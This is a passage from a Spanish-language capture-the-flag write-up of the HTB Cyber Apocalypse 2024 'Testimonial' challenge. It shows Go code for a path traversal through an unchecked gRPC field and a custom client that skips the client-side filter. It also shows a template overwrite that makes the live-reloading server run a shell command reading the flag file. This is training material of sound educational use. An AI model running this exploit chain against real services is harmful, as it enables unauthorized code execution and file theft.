<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1">, errors.</span><span class="mtk8">New</span><span class="mtk1">(</span><span class="mtk4">"Name is required"</span><span class="mtk1">)</span>
<span class="mtk1">        }</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> req.Testimonial </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1">, errors.</span><span class="mtk8">New</span><span class="mtk1">(</span><span class="mtk4">"Content is required"</span><span class="mtk1">)</span>
<span class="mtk1">        }</span>

<span class="mtk1">        err </span><span class="mtk5">:=</span><span class="mtk1"> os.</span><span class="mtk8">WriteFile</span><span class="mtk1">(fmt.</span><span class="mtk8">Sprintf</span><span class="mtk1">(</span><span class="mtk4">"public/testimonials/</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, req.Customer), []</span><span class="mtk7 mtki">byte</span><span class="mtk1">(req.Testimonial), </span><span class="mtk6">0644</span><span class="mtk1">)</span>
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> err </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1">, err</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">pb</span><span class="mtk1">.</span><span class="mtk8 mtku">GenericReply</span><span class="mtk1">{Message: </span><span class="mtk4">"Testimonial submitted successfully"</span><span class="mtk1">}, </span><span class="mtk6">nil</span>
<span class="mtk1">}</span>
</code></pre></div><p>Por lo tanto, podemos usar este sitio web para escribir testimonios. Estos testimonios se envían a través de HTTP, pero por detrás, el controlador HTTP llama a un cliente gRPC para enviar el testimonio al servidor gRPC.</p><h2 id="explotación">Explotación</h2><p>Podemos ver que el servidor gRPC guarda el archivo con la siguiente instrucción:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        err </span><span class="mtk5">:=</span><span class="mtk1"> os.</span><span class="mtk8">WriteFile</span><span class="mtk1">(fmt.</span><span class="mtk8">Sprintf</span><span class="mtk1">(</span><span class="mtk4">"public/testimonials/</span><span class="mtk6">%s</span><span class="mtk4">"</span><span class="mtk1">, req.Customer), []</span><span class="mtk7 mtki">byte</span><span class="mtk1">(req.Testimonial), </span><span class="mtk6">0644</span><span class="mtk1">)</span>  
<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> err </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1"> {</span>
<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1">, err</span>
<span class="mtk1">        }</span>
</code></pre></div><p>Controlamos la variable <code>req.Customer</code>, para que podamos usar una navegación de directorios para escribir el testimonio (<code>req.Testimonial</code>) en una ruta arbitraria del sistema de archivos.</p><p>El problema es que el cliente gRPC aplica un filtro muy estricto:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">func</span><span class="mtk1"> (</span><span class="mtk9 mtki">c </span><span class="mtk5">*</span><span class="mtk8 mtku">Client</span><span class="mtk1">) </span><span class="mtk8">SendTestimonial</span><span class="mtk1">(</span><span class="mtk9 mtki">customer</span><span class="mtk1">, </span><span class="mtk9 mtki">testimonial</span><span class="mtk1"> </span><span class="mtk7 mtki">string</span><span class="mtk1">) </span><span class="mtk7 mtki">error</span><span class="mtk1"> {</span>
<span class="mtk1">        ctx </span><span class="mtk5">:=</span><span class="mtk1"> context.</span><span class="mtk8">Background</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk3">// Filter bad characters.</span>
<span class="mtk1">        </span><span class="mtk5">for</span><span class="mtk1"> _, char </span><span class="mtk5">:=</span><span class="mtk1"> </span><span class="mtk5">range</span><span class="mtk1"> []</span><span class="mtk7 mtki">string</span><span class="mtk1">{</span><span class="mtk4">"/"</span><span class="mtk1">, </span><span class="mtk4">"</span><span class="mtk6">\\</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk4">":"</span><span class="mtk1">, </span><span class="mtk4">"*"</span><span class="mtk1">, </span><span class="mtk4">"?"</span><span class="mtk1">, </span><span class="mtk4">"</span><span class="mtk6">\"</span><span class="mtk4">"</span><span class="mtk1">, </span><span class="mtk4">"&lt;"</span><span class="mtk1">, </span><span class="mtk4">"&gt;"</span><span class="mtk1">, </span><span class="mtk4">"|"</span><span class="mtk1">, </span><span class="mtk4">"."</span><span class="mtk1">} {</span>
<span class="mtk1">                customer </span><span class="mtk5">=</span><span class="mtk1"> strings.</span><span class="mtk8">ReplaceAll</span><span class="mtk1">(customer, char, </span><span class="mtk4">""</span><span class="mtk1">)</span>
<span class="mtk1">        }</span>

<span class="mtk1">        _, err </span><span class="mtk5">:=</span><span class="mtk1"> c.</span><span class="mtk8">SubmitTestimonial</span><span class="mtk1">(ctx, </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">pb</span><span class="mtk1">.</span><span class="mtk8 mtku">TestimonialSubmission</span><span class="mtk1">{Customer: customer, Testimonial: testimonial})</span>  
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> err</span>
<span class="mtk1">}</span>
</code></pre></div><p>Sin embargo, no necesitamos evitar el filtro. El problema aquí es que el filtro está en el cliente, no en el servidor. Por lo tanto, simplemente podemos usar nuestro propio cliente gRPC para enviar un <em>payload</em> malicioso al servidor, ya que el puerto gRPC está abierto.</p><p>Entonces, ¿qué podemos escribir?</p><h3 id="escritura-de-archivos-arbitrarios">Escritura de archivos arbitrarios</h3><p>Sabemos por el <code>entrypoint.sh</code> que el nombre de archivo de la <em>flag</em> es aleatorio, por lo que necesitamos lograr ejecución remota de comandos:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">#!/bin/sh</span>

<span class="mtk3"># Change flag name</span>
<span class="mtk8">mv</span><span class="mtk1"> </span><span class="mtk4">/flag.txt</span><span class="mtk1"> </span><span class="mtk4">/flag$(</span><span class="mtk8">cat</span><span class="mtk4"> /dev/urandom </span><span class="mtk5">|</span><span class="mtk4"> </span><span class="mtk8">tr</span><span class="mtk4"> </span><span class="mtk6">-cd</span><span class="mtk4"> "a-f0-9" </span><span class="mtk5">|</span><span class="mtk4"> </span><span class="mtk8">head</span><span class="mtk4"> </span><span class="mtk6">-c</span><span class="mtk4"> </span><span class="mtk6">10</span><span class="mtk4">).txt</span>  

<span class="mtk3"># Secure entrypoint</span>
<span class="mtk8">chmod</span><span class="mtk1"> </span><span class="mtk6">600</span><span class="mtk1"> </span><span class="mtk4">/entrypoint.sh</span>

<span class="mtk3"># Start application</span>
<span class="mtk8">air</span>
</code></pre></div><p>Aquí también tenemos un punto clave, que es <a target="_blank" href="https://github.com/cosmtrek/air">air</a>. Esta es una herramienta que permite que la recarga en vivo para los proyectos en Go, por lo que se reinicia el servidor cada vez que se modifica un archivo de Go. Con esto, podemos hacer muchas cosas.</p><p>Por ejemplo, intentaremos ejecutar el siguiente comando:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk8">cat</span><span class="mtk1"> </span><span class="mtk4">/fl</span><span class="mtk9">*</span><span class="mtk1"> </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk4">/challenge/public/testimonials/flag.txt</span>  
</code></pre></div><p>Hay un archivo de configuración de <code>air</code> (<code>.air.toml</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">root</span><span class="mtk1"> = </span><span class="mtk4">"."</span>
<span class="mtk5">tmp_dir</span><span class="mtk1"> = </span><span class="mtk4">"tmp"</span>

<span class="mtk1">[</span><span class="mtk8">build</span><span class="mtk1">]</span>
<span class="mtk1">  </span><span class="mtk5">bin</span><span class="mtk1"> = </span><span class="mtk4">"./tmp/main"</span>
<span class="mtk1">  </span><span class="mtk5">cmd</span><span class="mtk1"> = </span><span class="mtk4">"templ generate &amp;&amp; go build -o ./tmp/main ."</span>  
<span class="mtk1">  </span>
<span class="mtk1">  </span><span class="mtk5">delay</span><span class="mtk1"> = </span><span class="mtk6">20</span>
<span class="mtk1">  </span><span class="mtk5">exclude_dir</span><span class="mtk1"> = [</span><span class="mtk4">"assets"</span><span class="mtk1">, </span><span class="mtk4">"tmp"</span><span class="mtk1">, </span><span class="mtk4">"vendor"</span><span class="mtk1">]</span>
<span class="mtk1">  </span><span class="mtk5">exclude_file</span><span class="mtk1"> = []</span>
<span class="mtk1">  </span><span class="mtk5">exclude_regex</span><span class="mtk1"> = [</span><span class="mtk4">".*_templ.go"</span><span class="mtk1">]</span>
<span class="mtk1">  </span><span class="mtk5">exclude_unchanged</span><span class="mtk1"> = </span><span class="mtk6">false</span>
<span class="mtk1">  </span><span class="mtk5">follow_symlink</span><span class="mtk1"> = </span><span class="mtk6">false</span>
<span class="mtk1">  </span><span class="mtk5">full_bin</span><span class="mtk1"> = </span><span class="mtk4">""</span>
<span class="mtk1">  </span><span class="mtk5">include_dir</span><span class="mtk1"> = []</span>
<span class="mtk1">  </span><span class="mtk5">include_ext</span><span class="mtk1"> = [</span><span class="mtk4">"tpl"</span><span class="mtk1">, </span><span class="mtk4">"tmpl"</span><span class="mtk1">, </span><span class="mtk4">"templ"</span><span class="mtk1">, </span><span class="mtk4">"html"</span><span class="mtk1">]</span>
<span class="mtk1">  </span><span class="mtk5">kill_delay</span><span class="mtk1"> = </span><span class="mtk4">"0s"</span>
<span class="mtk1">  </span><span class="mtk5">log</span><span class="mtk1"> = </span><span class="mtk4">"build-errors.log"</span>
<span class="mtk1">  </span><span class="mtk5">send_interrupt</span><span class="mtk1"> = </span><span class="mtk6">false</span>
<span class="mtk1">  </span><span class="mtk5">stop_on_error</span><span class="mtk1"> = </span><span class="mtk6">true</span>

<span class="mtk1">[</span><span class="mtk8">color</span><span class="mtk1">]</span>
<span class="mtk1">  </span><span class="mtk5">app</span><span class="mtk1"> = </span><span class="mtk4">""</span>
<span class="mtk1">  </span><span class="mtk5">build</span><span class="mtk1"> = </span><span class="mtk4">"yellow"</span>
<span class="mtk1">  </span><span class="mtk5">main</span><span class="mtk1"> = </span><span class="mtk4">"magenta"</span>
<span class="mtk1">  </span><span class="mtk5">runner</span><span class="mtk1"> = </span><span class="mtk4">"green"</span>
<span class="mtk1">  </span><span class="mtk5">watcher</span><span class="mtk1"> = </span><span class="mtk4">"cyan"</span>

<span class="mtk1">[</span><span class="mtk8">log</span><span class="mtk1">]</span>
<span class="mtk1">  </span><span class="mtk5">time</span><span class="mtk1"> = </span><span class="mtk6">false</span>

<span class="mtk1">[</span><span class="mtk8">misc</span><span class="mtk1">]</span>
<span class="mtk1">  </span><span class="mtk5">clean_on_exit</span><span class="mtk1"> = </span><span class="mtk6">false</span>
</code></pre></div><p>Aquí vemos que observa cambios en los archivos con extensión <code>tpl</code>, <code>tmpl</code>, <code>templ</code> o <code>html</code>, por lo que podemos simplemente modificar una plantilla como <code>views/home.templ</code> y agregar el comando anterior:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">package layout

// import "htbchal/view/ui"
import "os/exec"

func exploit() string {
	exec.Command("/bin/sh", "-c", "cat /fl* &gt; /challenge/public/testimonials/flag.txt").Run()  
	return ""
}

templ App(nav bool) {
	{exploit()}

	&lt;!DOCTYPE html&gt;
	&lt;html lang="en"&gt;
		&lt;head&gt;
			&lt;title&gt;Official website of the Fray&lt;/title&gt;
			&lt;meta charset="UTF-8"/&gt;
			&lt;link rel="stylesheet" href="/public/css/main.css"/&gt;
			&lt;link rel="stylesheet" href="/public/css/bootstrap.min.css"/&gt;
			&lt;script type="text/plain" src="/public/bootstrap.min.js"&gt;&lt;/script&gt;
		&lt;/head&gt;
		{ children... }
	&lt;/html&gt;
}
</code></pre></div><p>Ahora podemos crear este archivo principal (<code>solve.go</code>):</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">main</span>

<span class="mtk5">import</span><span class="mtk1"> (</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">htbchal/client</span><span class="mtk4">"</span>
<span class="mtk1">)</span>

<span class="mtk5">func</span><span class="mtk1"> </span><span class="mtk8">main</span><span class="mtk1">() {</span>
<span class="mtk1">        c, _ </span><span class="mtk5">:=</span><span class="mtk1"> client.</span><span class="mtk8">GetClient</span><span class="mtk1">()</span>
<span class="mtk1">        c.</span><span class="mtk8">SendTestimonial</span><span class="mtk1">(</span><span class="mtk4">"../../view/layout/app.templ"</span><span class="mtk1">, </span><span class="mtk4">`package layout</span>
<span class="mtk4">        </span>
<span class="mtk4">// import "htbchal/view/ui"</span>
<span class="mtk4">import "os/exec"</span>

<span class="mtk4">func exploit() string {</span>
<span class="mtk4">        exec.Command("/bin/sh", "-c", "cat /fl* &gt; /challe</span><span class="mtk4">nge/public/testimonials/flag.txt").Run()</span>
<span class="mtk4">        return ""</span>
<span class="mtk4">}</span>

<span class="mtk4">templ App(nav bool) {</span>
<span class="mtk4">        {exploit()}</span>

<span class="mtk4">        &lt;!DOCTYPE html&gt;</span>
<span class="mtk4">        &lt;html lang="en"&gt;</span>
<span class="mtk4">                &lt;head&gt;</span>
<span class="mtk4">                        &lt;title&gt;Official website of the Fray&lt;/title&gt;</span>
<span class="mtk4">                        &lt;meta charset="UTF-8"/&gt;</span>
<span class="mtk4">                        &lt;link rel="stylesheet" href="/public/css/main.c</span><span class="mtk4">ss"/&gt;</span>
<span class="mtk4">                        &lt;link rel="stylesheet" href="/public/css/bootst</span><span class="mtk4">rap.min.css"/&gt;</span>
<span class="mtk4">                        &lt;script type="text/plain" src="/public/bootstra</span><span class="mtk4">p.min.js"&gt;&lt;/script&gt;</span>  
<span class="mtk4">                &lt;/head&gt;</span>
<span class="mtk4">                { children... }</span>
<span class="mtk4">        &lt;/html&gt;</span>
<span class="mtk4">}</span>
<span class="mtk4">`</span><span class="mtk1">)</span>
<span class="mtk1">}</span>
</code></pre></div><p>Y copiar el archivo <code>client/client.go</code>, pero eliminando las verificaciones:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk5">package</span><span class="mtk1"> </span><span class="mtk8 mtku">client</span>

<span class="mtk5">import</span><span class="mtk1"> (</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">context</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">fmt</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">htbchal/pb</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">os</span><span class="mtk4">"</span>
<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">sync</span><span class="mtk4">"</span>

<span class="mtk1">        </span><span class="mtk4">"</span><span class="mtk4 detected-link">google.golang.org/grpc</span><span class="mtk4">"</span>
<span class="mtk1">)</span>

<span class="mtk5">var</span><span class="mtk1"> (</span>
<span class="mtk1">        grpcClient </span><span class="mtk5">*</span><span class="mtk8 mtku">Client</span>
<span class="mtk1">        mutex      </span><span class="mtk5">*</span><span class="mtk8 mtku">sync</span><span class="mtk1">.</span><span class="mtk8 mtku">Mutex</span>
<span class="mtk1">)</span>

<span class="mtk5">func</span><span class="mtk1"> </span><span class="mtk8">init</span><span class="mtk1">() {</span>
<span class="mtk1">        grpcClient </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">nil</span>
<span class="mtk1">        mutex </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">sync</span><span class="mtk1">.</span><span class="mtk8 mtku">Mutex</span><span class="mtk1">{}</span>
<span class="mtk1">}</span>

<span class="mtk5">type</span><span class="mtk1"> </span><span class="mtk8 mtku">Client</span><span class="mtk1"> </span><span class="mtk5">struct</span><span class="mtk1"> {</span>
<span class="mtk1">        </span><span class="mtk8 mtku">pb</span><span class="mtk1">.</span><span class="mtk8 mtku">RickyServiceClient</span>
<span class="mtk1">}</span>

<span class="mtk5">func</span><span class="mtk1"> </span><span class="mtk8">GetClient</span><span class="mtk1">() (</span><span class="mtk5">*</span><span class="mtk8 mtku">Client</span><span class="mtk1">, </span><span class="mtk7 mtki">error</span><span class="mtk1">) {</span>
<span class="mtk1">        mutex.</span><span class="mtk8">Lock</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk5">defer</span><span class="mtk1"> mutex.</span><span class="mtk8">Unlock</span><span class="mtk1">()</span>

<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> grpcClient </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1"> {</span>
<span class="mtk1">                conn, err </span><span class="mtk5">:=</span><span class="mtk1"> grpc.</span><span class="mtk8">Dial</span><span class="mtk1">(fmt.</span><span class="mtk8">Sprintf</span><span class="mtk1">(os.Args[</span><span class="mtk6">1</span><span class="mtk1">]), </span><span class="mtk1 squiggly-inline-deprecated">grpc.</span><span class="mtk8 squiggly-inline-deprecated">WithInsecure</span><span class="mtk1">())</span>
<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> err </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1"> {</span>
<span class="mtk1">                        </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">nil</span><span class="mtk1">, err</span>
<span class="mtk1">                }</span>

<span class="mtk1">                grpcClient </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">Client</span><span class="mtk1">{pb.</span><span class="mtk8">NewRickyServiceClient</span><span class="mtk1">(conn)}</span>
<span class="mtk1">        }</span>

<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> grpcClient, </span><span class="mtk6">nil</span>
<span class="mtk1">}</span>

<span class="mtk5">func</span><span class="mtk1"> (</span><span class="mtk9 mtki">c </span><span class="mtk5">*</span><span class="mtk8 mtku">Client</span><span class="mtk1">) </span><span class="mtk8">SendTestimonial</span><span class="mtk1">(</span><span class="mtk9 mtki">customer</span><span class="mtk1">, </span><span class="mtk9 mtki">testimonial</span><span class="mtk1"> </span><span class="mtk7 mtki">string</span><span class="mtk1">) </span><span class="mtk7 mtki">error</span><span class="mtk1"> {</span>
<span class="mtk1">        ctx </span><span class="mtk5">:=</span><span class="mtk1"> context.</span><span class="mtk8">Background</span><span class="mtk1">()</span>
<span class="mtk1">        </span><span class="mtk3">// Filter bad characters.</span>
<span class="mtk1">        </span><span class="mtk3">// for _, char := range []string{"/", "\\", ":", "</span><span class="mtk3">*", "?", "\"", "&lt;", "&gt;", "|", "."} {</span>
<span class="mtk1">        </span><span class="mtk3">//      customer = strings.ReplaceAll(customer, char, </span><span class="mtk3">"")</span>
<span class="mtk1">        </span><span class="mtk3">// }</span>

<span class="mtk1">        _, err </span><span class="mtk5">:=</span><span class="mtk1"> c.</span><span class="mtk8">SubmitTestimonial</span><span class="mtk1">(ctx, </span><span class="mtk5">&amp;</span><span class="mtk8 mtku">pb</span><span class="mtk1">.</span><span class="mtk8 mtku">TestimonialSubmission</span><span class="mtk1">{Customer: customer, Testimonial: testimonial})</span>  
<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> err</span>
<span class="mtk1">}</span>
</code></pre></div><h2 id="_flag_"><em>Flag</em></h2><p>En este punto, simplemente ejecutamos el proyecto en Go:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">go</span> run <span class="mtku">solve.go</span> 94.237.49.166:58578  
</code></pre></div><p>Y veremos la <em>flag</em> en el sitio web:</p><p><img alt="Testimonial 2" src="/images/other/HTB%20Cyber%20Apocalypse%202024/Testimonial-2.webp"></p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">HTB{w34kly_t35t3d_t3mplate5}  
</code></pre></div><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-del-código-fuente">Análisis del código fuente</a></li><li><a href="#explotación">Explotación</a><ul><li><a href="#escritura-de-archivos-arbitrarios">Escritura de archivos arbitrarios</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
</span></a><a href="https://github.com/7Rocky" target="_blank" class="link-transition github link dib z-999 pt3 pt0-l mr1" title="GitHub link" rel="noopener" aria-label="follow on GitHub——Opens in a new window"><svg height="30" style="enable-background:new 0 0 512 512" viewBox="0 0 512 512" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M256 32C132.3 32 32 134.8 32 261.7c0 101.5 64.2 187.5 153.2 217.9 11.2 2.1 15.3-5 15.3-11.1.0-5.5-.2-19.9-.3-39.1-62.3 13.9-75.5-30.8-75.5-30.8-10.2-26.5-24.9-33.6-24.9-33.6-20.3-14.3 1.5-14 1.5-14 22.5 1.6 34.3 23.7 34.3 23.7 20 35.1 52.4 25 65.2 19.1 2-14.8 7.8-25 14.2-30.7-49.7-5.8-102-25.5-102-113.5.0-25.1 8.7-45.6 23-61.6-2.3-5.8-10-29.2 2.2-60.8.0.0 18.8-6.2 61.6 23.5 17.9-5.1 37-7.6 56.1-7.7 19 .1 38.2 2.6 56.1 7.7 42.8-29.7 61.5-23.5 61.5-23.5 12.2 31.6 4.5 55 2.2 60.8 14.3 16.1 23 36.6 23 61.6.0 88.2-52.4 107.6-102.3 113.3 8 7.1 15.2 21.1 15.2 42.5.0 30.7-.3 55.5-.3 63 0 6.1 4 13.3 15.4 11C415.9 449.1 480 363.1 480 261.7 480 134.8 379.7 32 256 32z"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg></span></a></div></div></div></div></div></footer></body></html>